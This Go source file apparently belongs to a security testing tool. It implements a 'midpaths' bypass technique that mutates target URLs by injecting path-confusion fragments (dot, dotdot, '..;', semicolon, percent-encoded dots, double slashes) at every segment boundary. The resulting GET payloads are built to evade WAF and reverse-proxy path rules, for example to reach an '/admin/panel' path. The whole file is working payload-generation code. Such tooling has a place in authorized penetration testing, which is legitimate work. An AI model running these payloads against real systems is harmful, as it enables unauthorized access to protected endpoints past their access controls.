package bypass

import "fmt"

// MidpathsTechnique injects path-confusing fragments at every segment
// boundary to bypass path-matching middleware (WAFs, reverse proxies).
type MidpathsTechnique struct{}

// Name returns the technique identifier.
func (t *MidpathsTechnique) Name() string { return "midpaths" }

// Description returns a human-readable summary.
func (t *MidpathsTechnique) Description() string {
	return "Inject path fragments (./  ../  ..;/  ;/  %2e/  etc.) at each segment boundary"
}

// midpathInjection describes a single fragment to inject between segments.
type midpathInjection struct {
	value string
	raw   bool // true if contains encoded chars needing raw URL
	label string
}

// midpathInjections is the set of fragments injected at each boundary.
var midpathInjections = []midpathInjection{
	{".", false, "current-dir dot"},
	{"..", false, "parent-dir dotdot"},
	{"..;", false, "dotdot-semicolon"},
	{";", false, "semicolon"},
	{"%2e", true, "encoded dot"},
	{"%2e%2e", true, "encoded dotdot"},
	{".;", false, "dot-semicolon"},
	{"", false, "double-slash (empty segment)"},
}

// Generate produces midpath payloads for the given target.
func (t *MidpathsTechnique) Generate(target *Target) []Payload {
	segs := target.Segments
	if len(segs) == 0 {
		return nil
	}

	// We inject at every boundary position:
	//   Position 0 = before first segment  (e.g., /./admin/panel)
	//   Position 1 = between seg 0 and 1   (e.g., /admin/./panel)
	//   Position n = after last segment     (e.g., /admin/panel/./)
	positions := len(segs) + 1

	payloads := make([]Payload, 0, positions*len(midpathInjections))
	base := target.BaseURL()

	for _, inj := range midpathInjections {
		for pos := 0; pos < positions; pos++ {
			mutated := insertSeg(segs, pos, inj.value)
			path := joinPath(mutated...)
			fullURL := base + path

			desc := fmt.Sprintf("midpath: inject %q at position %d", inj.value, pos)
			if inj.value == "" {
				desc = fmt.Sprintf("midpath: double-slash at position %d", pos)
			}

			if inj.raw {
				payloads = append(payloads, makeRawPayload(
					t.Name(), desc, "GET", fullURL, nil,
				))
			} else {
				payloads = append(payloads, makePayload(
					t.Name(), desc, "GET", fullURL, nil,
				))
			}
		}
	}

	return payloads
}
